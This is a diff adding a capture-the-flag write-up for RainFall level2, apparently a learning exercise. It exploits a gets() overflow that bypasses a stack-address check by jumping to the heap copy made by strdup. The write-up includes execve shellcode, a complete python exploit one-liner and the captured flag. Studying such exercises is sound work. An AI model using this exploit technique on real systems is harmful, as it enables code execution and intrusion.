@@ -1,0 +1,96 @@
+# Level 2
+
+## Vulnerability
+Buffer overflow in `gets()` with return address validation bypass.
+
+We list the files will show us level2 and the program wait an input, it print what you typed and it quit after press enter
+
+```
+level2@RainFall:~$ ./level2 
+
+
+level2@RainFall:~$ ./level2 ooo
+
+
+level2@RainFall:~$ ./level2 
+lll
+lll
+level2@RainFall:~$ 
+
+```
+
+## Code Analysis
+
+After analyze the source.c we can see that the `main()` function call a function named `p()`.  
+
+```c
+void p(void) {
+    char buffer[76];
+    gets(buffer);  // Vulnerable!
+    
+    if ((return_address & 0xb0000000) == 0xb0000000) {
+        _exit(1);  // Blocks stack addresses (0xbf...)
+    }
+    
+    strdup(buffer);  // Copies to HEAP
+}
+```
+
+## Solution Steps
+1- 
+
+Let focus on the `p()` function.  
+As in level1, we can see a call to `gets()` function wich is vulnerable to buffer overflow attack.
+We can see that malloc always return the address `0x804a008` :
+
+```
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                               = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
+puts("")                                         = 1
+strdup("")                                       = 0x0804a008
++++ exited (status 8) +++
+level2@RainFall:~$
+```
+
+The restriction on our return address appears to be anything that starts with the the bit ‘b’ (indicated by the ‘and’ calculation with the value "0xb0000000").  
+Due to this check we couldn't point the return address to the stack (0xbf000000 - 0xbfffffff range). This avoids having a shellcode stored on the stack or in environment variable.  
+But if we can't use the stack we can use the heap ! 
+
+We see in the program that the buffer is later copied inside a strdup. This function use malloc who store the memory in ... the heap.
+```
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+```
+
+Now we can try to copy a shellcode in the heap by writing it in the input prompt and then write the allocated address (malloc) on the return address.  
+2. **Craft payload** 
+
+shellcode found https://shell-storm.org/shellcode/files/shellcode-516.html*  
+
+    Since our shellcode is 26 bytes long we could pad the back with any byte sequence, until 80 bytes then 4 last bytes for the return adress.  
+    Our final attack buffer will look like :  
+    - shellcode:
+
+`\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
+   - Padding: 54 bytes (`'X'*54`)
+   - Return address: `\x08\x04\xa0\x08` (heap address, reversed for little-endian)
+
+3. **Exploit**
+```bash
+   (python -c "print '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'X'*54 + '\x08\x04\xa0\x08'[::-1]"; cat) | ./level2
+```
+
+4. **Get flag**
+```bash
+   whoami
+   level3
+   cat /home/user/level3/.pass
+   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+## Key Concept
+Return address check blocks stack (0xb0000000), so we:
+1. Place shellcode in buffer
+2. `strdup()` copies it to **heap** (lower address)
+3. Redirect execution to heap address to bypass validation
